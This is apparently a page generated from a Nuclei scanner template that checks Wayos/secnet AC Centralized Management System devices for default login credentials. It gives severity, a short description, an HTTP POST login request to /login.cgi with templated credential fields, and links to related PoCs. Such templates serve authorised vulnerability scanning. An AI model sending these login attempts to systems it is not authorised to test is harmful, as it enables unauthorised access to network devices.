# Nuclei Template: AC Centralized Management System - Default password
**Template ID:** ac-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`ac-weak-login.yaml`)

## Vulnerability Information & PoC

## Description
AC Centralized Management System default login credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /login.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

user={{username}}&password={{ password }}&Submit=%E7%99%BB%E5%BD%95
```

## References
- https://github.com/Ershu1/2021_Hvv/blob/main/Wayos%20AC%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%BC%B1%E5%8F%A3%E4%BB%A4.md
- https://github.com/chaitin/xray/blob/master/pocs/secnet-ac-default-password.yml
